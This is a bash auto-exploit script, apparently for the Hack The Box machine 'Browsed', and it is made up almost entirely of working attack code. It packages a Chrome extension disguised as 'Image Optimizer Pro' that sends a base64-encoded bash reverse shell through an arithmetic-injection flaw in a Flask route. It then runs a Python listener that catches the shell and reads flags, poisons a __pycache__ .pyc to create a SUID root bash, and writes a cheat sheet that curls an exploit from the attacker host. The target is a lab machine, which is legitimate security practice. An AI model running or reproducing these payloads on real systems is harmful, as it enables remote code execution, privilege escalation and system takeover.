#!/usr/bin/env bash
# =============================================================================
#  ██████╗ ██████╗  ██████╗ ██╗    ██╗███████╗███████╗██████╗
#  ██╔══██╗██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔════╝██╔══██╗
#  ██████╔╝██████╔╝██║   ██║██║ █╗ ██║███████╗█████╗  ██║  ██║
#  ██╔══██╗██╔══██╗██║   ██║██║███╗██║╚════██║██╔══╝  ██║  ██║
#  ██████╔╝██║  ██║╚██████╔╝╚███╔███╔╝███████║███████╗██████╔╝
#  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝╚══════╝╚═════╝
#
#  HTB Browsed Full Auto-Pwn Script
#  Chain: Chrome Extension -> Arithmetic Injection -> RCE -> pycache PrivEsc
#  Author : Shadow Junior (bhanu)
#  Usage  : ./browsed.sh <TARGET_IP> [LHOST] [LPORT]
# =============================================================================

set -uo pipefail

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
RED='\033[0;31m';    GREEN='\033[0;32m';   YELLOW='\033[1;33m'
CYAN='\033[0;36m';   BLUE='\033[0;34m';   MAGENTA='\033[0;35m'
WHITE='\033[1;37m';  BOLD='\033[1m';       RESET='\033[0m'
BG_RED='\033[41m';   BG_GREEN='\033[42m';  BG_BLUE='\033[44m'

banner() {
  echo -e "${BLUE}"
  cat << 'EOF'
  ██████╗ ██████╗  ██████╗ ██╗    ██╗███████╗███████╗██████╗
  ██╔══██╗██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔════╝██╔══██╗
  ██████╔╝██████╔╝██║   ██║██║ █╗ ██║███████╗█████╗  ██║  ██║
  ██╔══██╗██╔══██╗██║   ██║██║███╗██║╚════██║██╔══╝  ██║  ██║
  ██████╔╝██║  ██║╚██████╔╝╚███╔███╔╝███████║███████╗██████╔╝
  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝╚══════╝╚═════╝
          HTB Auto-Pwn  🌐  by Shadow Jr
EOF
  echo -e "${RESET}"
}

phase()   { echo -e "\n${BG_BLUE}${WHITE}${BOLD}  [PHASE $1]  $2  ${RESET}\n"; }
info()    { echo -e "${CYAN}[*]${RESET} $1"; }
success() { echo -e "${GREEN}[+]${RESET} $1"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $1"; }
error()   { echo -e "${RED}[✗]${RESET} $1"; }
flag()    { echo -e "\n${BG_RED}${WHITE}${BOLD}  🏁  FLAG: $1  ${RESET}\n"; }
divider() { echo -e "${MAGENTA}$(printf '─%.0s' {1..70})${RESET}"; }
step()    { echo -e "  ${YELLOW}→${RESET} $1"; }
die()     { error "$1"; exit 1; }

check_deps() {
  local missing=()
  for dep in nmap curl python3 nc zip timeout ss; do
    command -v "$dep" &>/dev/null || missing+=("$dep")
  done
  [[ ${#missing[@]} -gt 0 ]] && warn "Missing deps: ${missing[*]}" || success "Dependencies OK"
}

# ─────────────────────────────────────────────────────────────────────────────
# ARGS
# ─────────────────────────────────────────────────────────────────────────────
[[ $# -lt 1 ]] && { banner; die "Usage: $0 <TARGET_IP> [LHOST] [LPORT]"; }

TARGET="$1"
LHOST="${2:-$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet )[^/]+' | head -1)}"
LPORT="${3:-443}"
LPORT2="${4:-4445}"   # second listener for privesc shell
DOMAIN="browsed.htb"
WORKDIR="/tmp/browsed_pwn_$$"
UPLOAD_URL="http://${DOMAIN}/upload.php"
COOKIE_JAR="$WORKDIR/cookies.txt"
UPLOAD_LOG="$WORKDIR/upload_output.txt"
UPLOAD_HEADERS="$WORKDIR/upload_headers.txt"
HANDLER_SCRIPT="$WORKDIR/shell_handler.py"
HANDLER_OUT="$WORKDIR/shell_handler.out"
HANDLER_PID=""
USER_FLAG=""
ROOT_FLAG=""
UPLOAD_OK=0
EXT_EXEC_OK=0
LPORT_USER_SET=0
[[ $# -ge 3 ]] && LPORT_USER_SET=1

port_in_use() {
  local p="$1"
  ss -tln 2>/dev/null | awk '{print $4}' | grep -Eq "(^|:)$p$"
}

pick_port() {
  local p
  for p in "$@"; do
    port_in_use "$p" && continue
    echo "$p"
    return 0
  done
  return 1
}

mkdir -p "$WORKDIR"
cd "$WORKDIR" || die "Cannot create workdir"

cleanup() {
  [[ -n "${HANDLER_PID:-}" ]] && kill "$HANDLER_PID" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

banner
divider
echo -e "  ${CYAN}Target${RESET}  : ${WHITE}$TARGET${RESET}"
echo -e "  ${CYAN}LHOST  ${RESET}  : ${WHITE}$LHOST${RESET}"
echo -e "  ${CYAN}LPORT  ${RESET}  : ${WHITE}$LPORT${RESET}  (reverse shell)"
echo -e "  ${CYAN}LPORT2 ${RESET}  : ${WHITE}$LPORT2${RESET}  (root shell)"
echo -e "  ${CYAN}Domain ${RESET}  : ${WHITE}$DOMAIN${RESET}"
divider
check_deps

[[ -z "${LHOST:-}" ]] && die "Could not auto-detect LHOST. Pass it explicitly: $0 <TARGET_IP> <LHOST> [LPORT]"

# Resolve callback port robustly.
if [[ "$LPORT_USER_SET" -eq 1 ]]; then
  if port_in_use "$LPORT"; then
    warn "Requested LPORT $LPORT is busy. Trying automatic fallback..."
    NEW_LPORT=$(pick_port 443 80 4444 9001 10080 18080 || true)
    [[ -z "${NEW_LPORT:-}" ]] && die "No available callback port found."
    warn "Switching callback port: $LPORT -> $NEW_LPORT"
    LPORT="$NEW_LPORT"
  fi
else
  NEW_LPORT=$(pick_port "$LPORT" 80 4444 9001 10080 18080 || true)
  [[ -z "${NEW_LPORT:-}" ]] && die "No available callback port found."
  if [[ "$NEW_LPORT" != "$LPORT" ]]; then
    warn "Auto-selected callback port $NEW_LPORT (default $LPORT unavailable here)"
    LPORT="$NEW_LPORT"
  fi
  if [[ "$EUID" -ne 0 && ("$LPORT" == "443" || "$LPORT" == "80") ]]; then
    warn "Using low callback port ${LPORT}; script will auto-fallback if local bind permission is denied."
  fi
fi

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 1 SETUP & RECON
# ─────────────────────────────────────────────────────────────────────────────
phase 1 "SETUP & RECONNAISSANCE"

if ! grep -q "$DOMAIN" /etc/hosts 2>/dev/null; then
  info "Adding $TARGET $DOMAIN to /etc/hosts"
  echo "$TARGET $DOMAIN" | sudo tee -a /etc/hosts > /dev/null
  success "Hosts entry added"
else
  info "$DOMAIN already in /etc/hosts"
fi

info "Running nmap scan..."
nmap -sC -sV -p 22,80 --min-rate 5000 -oN "$WORKDIR/nmap.txt" "$TARGET" 2>/dev/null
success "Nmap complete"
grep "^[0-9]" "$WORKDIR/nmap.txt" | grep open | while read -r line; do
  step "$line"
done

# Verify web is up
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$DOMAIN/" --max-time 5)
[[ "$HTTP_CODE" == "000" ]] && die "Web server not reachable on http://$DOMAIN/"
success "Web server responding: HTTP $HTTP_CODE"

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2 CHROME EXTENSION PAYLOAD CONSTRUCTION
# ─────────────────────────────────────────────────────────────────────────────
phase 2 "BUILDING MALICIOUS CHROME EXTENSION"

info "Vulnerability: Arithmetic injection via Flask /routines/<path>"
info "Technique:     a[\$(echo BASE64 | base64 -d | bash)] in URL path"
info "Delivery:      Chrome extension fetch() to internal http://127.0.0.1:5000/routines/"

# Build extension directory
EXT_DIR="$WORKDIR/malicious-ext"
mkdir -p "$EXT_DIR"

# The reverse shell command kept simple (no single quotes around bash -i for cleaner btoa)
REV_CMD="bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"

# Base64-encode the command (Python for consistency)
B64_CMD=$(python3 -c "import base64; print(base64.b64encode('${REV_CMD}'.encode()).decode())")
info "Encoded payload: $B64_CMD"

# content.js the exploit JavaScript
cat > "$EXT_DIR/content.js" << JSEOF
// HTB Browsed Arithmetic Injection via Chrome Extension
// Exploit: URL arithmetic eval a[\$(cmd)] in Flask /routines/<path>
// Author: Shadow Junior

const TARGETS = [
  "http://127.0.0.1:5000/routines/",
  "http://localhost:5000/routines/",
  "http://browsedinternals.htb/routines/"
];
const b64      = "${B64_CMD}";

// Build arithmetic injection: a[\$(echo B64|base64 -d|bash)]
const exploitRaw = \`a[\$(echo \${b64}|base64 -d|bash)]\`;
const exploit = encodeURIComponent(exploitRaw);

console.log("BROWSED_PWN_START");

for (const target of TARGETS) {
  fetch(target + exploit, { mode: "no-cors", cache: "no-store" })
    .then(() => console.log("BROWSED_PWN_FETCH_SENT", target))
    .catch((e) => console.log("BROWSED_PWN_FETCH_ERR", target, String(e)));
  const img = new Image();
  img.src = target + exploit;
  console.log("BROWSED_PWN_IMG_SENT", target);
}
JSEOF

success "content.js created"
step "Payload: $REV_CMD"

# manifest.json Chrome MV3 extension manifest
cat > "$EXT_DIR/manifest.json" << 'MANEOF'
{
  "manifest_version": 3,
  "name": "Image Optimizer Pro",
  "version": "2.1.0",
  "description": "Optimizes and replaces images for faster page loading.",
  "permissions": ["scripting"],
  "host_permissions": [
    "http://127.0.0.1:5000/*",
    "http://localhost:5000/*",
    "http://browsedinternals.htb/*"
  ],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ]
}
MANEOF

success "manifest.json created"

# Package to .zip
cd "$EXT_DIR" && zip -r "$WORKDIR/malicious-ext.zip" . > /dev/null && cd "$WORKDIR"
success "Extension packaged: $WORKDIR/malicious-ext.zip"
step "Contents:"
unzip -l "$WORKDIR/malicious-ext.zip" | grep -v Archive | grep -v total | grep -v "^--"

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 3 START LISTENER
# ─────────────────────────────────────────────────────────────────────────────
phase 3 "STARTING REVERSE SHELL LISTENER"

info "Checking if port $LPORT is available..."
if ss -tlnp 2>/dev/null | grep -q ":$LPORT"; then
  die "Port $LPORT already in use free it first, then re-run"
else
  info "Starting automated Python socket handler on ${LHOST}:${LPORT}..."
  cat > "$HANDLER_SCRIPT" << 'PYEOF'
#!/usr/bin/env python3
import re
import socket
import sys
import time
from pathlib import Path

host = sys.argv[1]
port = int(sys.argv[2])
workdir = Path(sys.argv[3])
timeout_wait = int(sys.argv[4]) if len(sys.argv) > 4 else 210

user_flag_re = re.compile(r"(HTB\{[^}]+\}|[a-fA-F0-9]{32})")

transcript = workdir / "shell_transcript.txt"
user_out = workdir / "user_flag.txt"
root_out = workdir / "root_flag.txt"
status_out = workdir / "shell_status.txt"

def write_line(msg: str):
    with transcript.open("a", encoding="utf-8", errors="ignore") as f:
        f.write(msg.rstrip("\n") + "\n")

def recv_available(conn: socket.socket, wait: float = 1.2) -> str:
    end = time.time() + wait
    buf = []
    while time.time() < end:
        try:
            chunk = conn.recv(8192)
            if not chunk:
                break
            buf.append(chunk.decode("utf-8", errors="ignore"))
            end = time.time() + 0.4
        except socket.timeout:
            time.sleep(0.05)
        except Exception:
            break
    return "".join(buf)

def send_cmd(conn: socket.socket, cmd: str, wait: float = 1.8) -> str:
    try:
        conn.sendall((cmd + "\n").encode())
    except Exception:
        return ""
    time.sleep(wait)
    out = recv_available(conn, wait=wait)
    write_line(f"$ {cmd}\n{out}")
    return out

def extract_flag(text: str):
    m = user_flag_re.search(text)
    return m.group(1) if m else ""

def main():
    status_out.write_text("waiting", encoding="utf-8")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(1)
        srv.settimeout(timeout_wait)
        write_line(f"[*] Listening on {host}:{port}")
        try:
            conn, addr = srv.accept()
        except Exception as e:
            status_out.write_text(f"no_shell:{e}", encoding="utf-8")
            return

    with conn:
        conn.settimeout(0.6)
        status_out.write_text("connected", encoding="utf-8")
        write_line(f"[+] Connection from {addr}")
        time.sleep(1.0)
        banner = recv_available(conn, wait=1.2)
        write_line(banner)

        send_cmd(conn, "echo __BROWSED_SHELL_OK__", wait=1.0)
        send_cmd(conn, "id; whoami; uname -a", wait=1.0)

        # Capture user flag
        p = send_cmd(conn, "find /home -maxdepth 4 -name user.txt -type f 2>/dev/null | head -n1", wait=1.0)
        user_path = ""
        for line in p.splitlines():
            line = line.strip()
            if line.startswith("/home/") and line.endswith("user.txt"):
                user_path = line
                break
        if user_path:
            u = send_cmd(conn, f"cat {user_path}", wait=1.0)
            uf = extract_flag(u)
            if uf:
                user_out.write_text(uf + "\n", encoding="utf-8")
                write_line(f"[+] USER_FLAG={uf}")

        # Pycache poisoning privesc
        send_cmd(conn, "orig=/opt/extensiontool/extension_utils.py; target=/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc; [ -f \"$orig\" ] && echo __EXT_TOOL_PRESENT__", wait=1.0)
        send_cmd(conn, "printf 'import os\\ndef validate_manifest(path):\\n    os.system(\"cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\")\\n    return {}\\ndef clean_temp_files(arg):\\n    pass\\n' > /tmp/extension_utils.py", wait=1.0)
        send_cmd(conn, "size=$(stat -c%s \"$orig\" 2>/dev/null); pylen=$(wc -c </tmp/extension_utils.py 2>/dev/null); pad=$((size-pylen)); if [ \"$pad\" -gt 0 ]; then head -c \"$pad\" /dev/zero | tr '\\000' '#' >> /tmp/extension_utils.py; fi", wait=1.2)
        send_cmd(conn, "touch -r \"$orig\" /tmp/extension_utils.py 2>/dev/null", wait=0.8)
        send_cmd(conn, "python3.12 -c 'import py_compile;py_compile.compile(\"/tmp/extension_utils.py\", cfile=\"/tmp/m.pyc\", doraise=True)'", wait=1.2)
        send_cmd(conn, "cp /tmp/m.pyc \"$target\" 2>/dev/null && echo __PYC_POISONED__", wait=1.0)
        send_cmd(conn, "sudo -n /opt/extensiontool/extension_tool.py --ext Fontify", wait=1.3)
        r = send_cmd(conn, "/tmp/rootbash -p -c 'id; cat /root/root.txt' 2>/dev/null", wait=1.2)
        rf = extract_flag(r)
        if rf:
            root_out.write_text(rf + "\n", encoding="utf-8")
            write_line(f"[+] ROOT_FLAG={rf}")

        status_out.write_text("done", encoding="utf-8")

if __name__ == "__main__":
    main()
PYEOF

  chmod +x "$HANDLER_SCRIPT"
  python3 "$HANDLER_SCRIPT" "$LHOST" "$LPORT" "$WORKDIR" 210 >"$HANDLER_OUT" 2>&1 &
  HANDLER_PID=$!
  sleep 0.5

  # If low-port bind is denied under current user, retry via sudo.
  if ! kill -0 "$HANDLER_PID" 2>/dev/null; then
    if [[ "$EUID" -ne 0 ]] && (( LPORT < 1024 )) && rg -qi "permission denied|errno 13|permissionerror" "$HANDLER_OUT" 2>/dev/null; then
      warn "Local bind to ${LPORT} denied as non-root. Retrying listener with sudo..."
      sudo python3 "$HANDLER_SCRIPT" "$LHOST" "$LPORT" "$WORKDIR" 210 >"$HANDLER_OUT" 2>&1 &
      HANDLER_PID=$!
      sleep 0.5
    fi
  fi

  kill -0 "$HANDLER_PID" 2>/dev/null || die "Handler failed to start (see $HANDLER_OUT)"
  success "Automated handler started (PID $HANDLER_PID)"
  step "Handler transcript: $WORKDIR/shell_transcript.txt"
fi

sleep 1

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 4 UPLOAD EXTENSION TO WEB APP
# ─────────────────────────────────────────────────────────────────────────────
phase 4 "UPLOADING MALICIOUS EXTENSION"

info "Probing upload page metadata..."
UPLOAD_PAGE_HTML="$WORKDIR/upload_page.html"
curl -sS --max-time 15 "$UPLOAD_URL" -o "$UPLOAD_PAGE_HTML" || die "Could not reach $UPLOAD_URL"

# upload.php form has no explicit action; it posts to itself.
UPLOAD_ACTION="/upload.php"
FILE_PARAM=$(rg -oP 'type="file"[^>]*name="\K[^"]+' "$UPLOAD_PAGE_HTML" | head -1 || true)
[[ -z "$FILE_PARAM" ]] && FILE_PARAM="extension"

step "Upload endpoint: ${UPLOAD_ACTION}"
step "File field:      ${FILE_PARAM}"

info "Uploading extension zip via multipart POST..."
UPLOAD_RESP=$(curl -sS --max-time 45 -L \
  -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -e "$UPLOAD_URL" \
  -F "${FILE_PARAM}=@${WORKDIR}/malicious-ext.zip;type=application/zip" \
  "http://$DOMAIN${UPLOAD_ACTION}" \
  -D "$UPLOAD_HEADERS")

HTTP_STATUS=$(grep -oP '^HTTP/[0-9.]+\s+\K\d{3}' "$UPLOAD_HEADERS" | tail -1 || echo "000")
info "Upload response: HTTP $HTTP_STATUS"

if [[ "$HTTP_STATUS" =~ ^(200|201|302)$ ]]; then
  UPLOAD_OK=1
  success "Upload request accepted by upload.php"
else
  warn "Upload returned HTTP ${HTTP_STATUS}"
fi

info "Polling upload.php?output=1 for extension execution logs..."
for i in $(seq 1 20); do
  curl -sS --max-time 12 -b "$COOKIE_JAR" "${UPLOAD_URL}?output=1" > "$UPLOAD_LOG" || true
  if rg -q "BROWSED_PWN_START|BROWSED_PWN_FETCH_SENT|NotifyBeforeURLRequest: http://(127\\.0\\.0\\.1|localhost):5000/routines/|NotifyBeforeURLRequest: http://browsedinternals\\.htb/routines/|chrome-extension://.*/content.js|Running command: timeout .*chrome" "$UPLOAD_LOG"; then
    EXT_EXEC_OK=1
    success "Extension execution evidence detected (poll $i/20)"
    break
  fi
  sleep 1
done

if [[ "$EXT_EXEC_OK" -eq 0 ]]; then
  warn "No strong execution marker detected yet. Check: $UPLOAD_LOG"
fi

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 5 WAIT FOR SHELL & USER FLAG
# ─────────────────────────────────────────────────────────────────────────────
phase 5 "WAITING FOR REVERSE SHELL"

if [[ "$UPLOAD_OK" -eq 0 ]]; then
  warn "Upload did not return a successful HTTP status. Shell callback unlikely."
fi

info "Waiting for automated handler to catch shell and extract flags..."
for i in $(seq 1 210); do
  if [[ -z "$USER_FLAG" && -f "$WORKDIR/user_flag.txt" ]]; then
    USER_FLAG=$(tr -d '\r\n' < "$WORKDIR/user_flag.txt" 2>/dev/null || true)
  fi
  if [[ -z "$ROOT_FLAG" && -f "$WORKDIR/root_flag.txt" ]]; then
    ROOT_FLAG=$(tr -d '\r\n' < "$WORKDIR/root_flag.txt" 2>/dev/null || true)
  fi

  if [[ -n "$ROOT_FLAG" ]]; then
    success "Root flag captured automatically"
    break
  fi

  if [[ -n "$HANDLER_PID" ]] && ! kill -0 "$HANDLER_PID" 2>/dev/null; then
    break
  fi
  sleep 1
done

if [[ -z "$USER_FLAG" && -f "$WORKDIR/user_flag.txt" ]]; then
  USER_FLAG=$(tr -d '\r\n' < "$WORKDIR/user_flag.txt" 2>/dev/null || true)
fi
if [[ -z "$ROOT_FLAG" && -f "$WORKDIR/root_flag.txt" ]]; then
  ROOT_FLAG=$(tr -d '\r\n' < "$WORKDIR/root_flag.txt" 2>/dev/null || true)
fi

if [[ -n "$USER_FLAG" ]]; then
  success "User flag captured"
  echo -e "  ${YELLOW}→${RESET} ${USER_FLAG}"
else
  warn "User flag not captured automatically"
fi

if [[ -n "$ROOT_FLAG" ]]; then
  success "Root flag captured"
  echo -e "  ${YELLOW}→${RESET} ${ROOT_FLAG}"
else
  warn "Root flag not captured automatically"
  info "Handler logs: $HANDLER_OUT"
  info "Transcript:   $WORKDIR/shell_transcript.txt"
fi

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 6 PRIVILEGE ESCALATION EXPLOIT (Pycache Poisoning)
# ─────────────────────────────────────────────────────────────────────────────
phase 6 "PRIVILEGE ESCALATION PYCACHE POISONING"

info "Generating pycache poisoning exploit for /opt/extensiontool/..."

cat > "$WORKDIR/exploit_privesc.py" << 'PYEOF'
#!/usr/bin/env python3.12
"""
HTB Browsed Python __pycache__ Poisoning PrivEsc
Target: /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
Trigger: sudo /opt/extensiontool/extension_tool.py --ext Fontify
Result:  /tmp/rootbash with SUID bit (run with -p to get root)
"""
import os, py_compile, shutil, sys

ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"
TARGET_PYC    = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"
ROOTBASH      = "/tmp/rootbash"

def check_writable():
    pyc_dir = os.path.dirname(TARGET_PYC)
    if os.access(TARGET_PYC, os.W_OK):
        return True
    if os.access(pyc_dir, os.W_OK):
        return True
    print(f"[-] Cannot write to {TARGET_PYC} or {pyc_dir}")
    print(f"[-] Check: ls -la {pyc_dir}")
    return False

def poison():
    if not os.path.exists(ORIGINAL_SRC):
        print(f"[-] Original not found: {ORIGINAL_SRC}")
        sys.exit(1)

    if not check_writable():
        sys.exit(1)

    stat        = os.stat(ORIGINAL_SRC)
    target_size = stat.st_size
    print(f"[*] Original size : {target_size} bytes")
    print(f"[*] Original mtime: {stat.st_mtime}")

    # Malicious payload creates SUID copy of bash
    payload = (
        'import os\n'
        'def validate_manifest(path):\n'
        f'    os.system("cp /bin/bash {ROOTBASH} && chmod u+s {ROOTBASH}")\n'
        '    return {}\n'
        'def clean_temp_files(arg): pass\n'
    )

    padding = target_size - len(payload)
    if padding < 0:
        print(f"[-] Payload too large by {abs(padding)} bytes shrink it")
        sys.exit(1)

    payload += "#" * padding
    print(f"[*] Padded to      : {len(payload)} bytes ✓")

    with open(MALICIOUS_SRC, "w") as f:
        f.write(payload)

    # Sync atime + mtime to match original (prevents Python re-compilation)
    os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))
    print("[*] Timestamps synced ✓")

    # Compile to Python 3.12 bytecode
    py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc", doraise=True)
    print("[*] Compiled to /tmp/malicious.pyc ✓")

    # Inject into target __pycache__
    if os.path.exists(TARGET_PYC):
        os.remove(TARGET_PYC)
    shutil.copy("/tmp/malicious.pyc", TARGET_PYC)

    print(f"[+] ══════════════════════════════════════════")
    print(f"[+]  Poisoned .pyc injected → {TARGET_PYC}")
    print(f"[+] ══════════════════════════════════════════")
    print(f"[*] Trigger: sudo /opt/extensiontool/extension_tool.py --ext Fontify")
    print(f"[*] Verify : ls -la {ROOTBASH}")
    print(f"[*] Root   : {ROOTBASH} -p")
    print(f"[*] Flag   : cat /root/root.txt")

if __name__ == "__main__":
    poison()
PYEOF

chmod +x "$WORKDIR/exploit_privesc.py"

# Also write a quick one-liner version for manual copy-paste
cat > "$WORKDIR/privesc_commands.txt" << CMDSEOF
# ── INSIDE REVERSE SHELL (as www-data) ────────────────────────────────

# 1. Check sudo permissions
sudo -l

# 2. Check __pycache__ is writable
ls -la /opt/extensiontool/__pycache__/

# 3. Upload exploit (from attacker run this on YOUR machine)
# curl http://${LHOST}:8000/exploit_privesc.py -o /tmp/exploit_privesc.py
# (serve with: cd ${WORKDIR} && python3 -m http.server 8000)

# 4. Run exploit
python3.12 /tmp/exploit_privesc.py

# 5. Trigger root execution
sudo /opt/extensiontool/extension_tool.py --ext Fontify

# 6. Verify SUID
ls -la /tmp/rootbash
# Expected: -rwsr-xr-x 1 root root ...

# 7. ROOT SHELL
/tmp/rootbash -p
whoami   # root
cat /root/root.txt
CMDSEOF

success "PrivEsc exploit: $WORKDIR/exploit_privesc.py"
success "Commands cheat:  $WORKDIR/privesc_commands.txt"

info "Manual fallback helper generated."
info "If auto-root fails, follow: $WORKDIR/privesc_commands.txt"

# ─────────────────────────────────────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
divider
echo -e "\n${GREEN}${BOLD}  ✅  BROWSED AUTO-PWN RUN COMPLETE  ${RESET}\n"
divider
echo ""
echo -e "  ${CYAN}Recon      ${RESET}  ${GREEN}✓${RESET}  nmap → nginx + ports 22,80"
echo -e "  ${CYAN}Extension  ${RESET}  ${GREEN}✓${RESET}  Packed → $WORKDIR/malicious-ext.zip"
[[ "$UPLOAD_OK" -eq 1 ]] && up_mark="${GREEN}✓${RESET}" || up_mark="${RED}✗${RESET}"
[[ "$EXT_EXEC_OK" -eq 1 ]] && ex_mark="${GREEN}✓${RESET}" || ex_mark="${YELLOW}!${RESET}"
echo -e "  ${CYAN}Upload     ${RESET}  ${up_mark}  ${UPLOAD_URL} (field: extension)"
echo -e "  ${CYAN}Exec Log   ${RESET}  ${ex_mark}  $UPLOAD_LOG"
echo -e "  ${CYAN}Handler    ${RESET}  ${GREEN}✓${RESET}  python socket listener on $LHOST:$LPORT"
echo -e "  ${CYAN}PrivEsc    ${RESET}  ${GREEN}✓${RESET}  $WORKDIR/exploit_privesc.py (fallback)"
echo ""
if [[ -n "$USER_FLAG" ]]; then
  echo -e "  ${BG_GREEN}${WHITE}${BOLD} USER FLAG ${RESET} ${YELLOW}${BOLD}${USER_FLAG}${RESET}"
else
  echo -e "  ${BG_RED}${WHITE}${BOLD} USER FLAG ${RESET} ${WHITE}Not captured${RESET}"
fi

if [[ -n "$ROOT_FLAG" ]]; then
  echo -e "  ${BG_GREEN}${WHITE}${BOLD} ROOT FLAG ${RESET} ${YELLOW}${BOLD}${ROOT_FLAG}${RESET}"
else
  echo -e "  ${BG_RED}${WHITE}${BOLD} ROOT FLAG ${RESET} ${WHITE}Not captured${RESET}"
fi

if [[ -z "$ROOT_FLAG" ]]; then
  echo ""
  echo -e "  ${BOLD}Fallback Next Steps:${RESET}"
  echo -e "  ${YELLOW}1.${RESET} Inspect logs: ${WORKDIR}/shell_transcript.txt and ${UPLOAD_LOG}"
  echo -e "  ${YELLOW}2.${RESET} Use manual commands: ${WORKDIR}/privesc_commands.txt"
fi
divider
